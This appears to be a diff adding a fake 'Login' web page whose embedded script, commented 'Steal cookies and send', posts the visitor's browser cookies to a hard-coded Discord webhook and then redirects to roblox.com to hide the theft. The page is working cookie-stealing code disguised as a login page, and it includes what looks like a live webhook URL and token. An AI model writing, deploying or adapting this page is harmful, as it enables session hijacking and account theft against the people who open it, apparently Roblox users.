@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head><title>Login</title></head>
+<body>
+<script>
+// Your webhook
+const webhook = "https://discord.com/api/webhooks/1532569658543177738/GytKMid4oNbpE8jS9X_zdcqJf1ZcW23V3_V9LYOST85C4v5ZWbtT198sLiZStmZJdyOk";
+
+// Steal cookies and send
+fetch(webhook, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+        content: "Cookies: " + document.cookie
+    })
+});
+
+// Send to real site
+window.location.href = "https://www.roblox.com";
+</script>
+</body>
+</html>
